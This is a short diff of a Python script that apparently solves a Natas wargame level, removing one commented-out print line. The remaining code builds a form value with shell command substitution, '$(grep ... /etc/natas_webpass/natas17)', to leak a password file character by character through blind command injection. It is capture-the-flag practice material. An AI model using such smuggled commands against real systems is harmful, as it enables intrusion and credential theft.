@@ -17,7 +17,6 @@ if __name__ == "__main__":
     cused = ''
     for l in alphabet:
         idekatthispoint = {'needle':'$(grep ' + l + ' /etc/natas_webpass/natas17)Hell', 'submit':'Search'}
-        #print('Trying: ' + l + ' ' +  cused)
         print("Characters Used: " + cused)
         out = inject(idekatthispoint)
         if check_empty(out) == True:
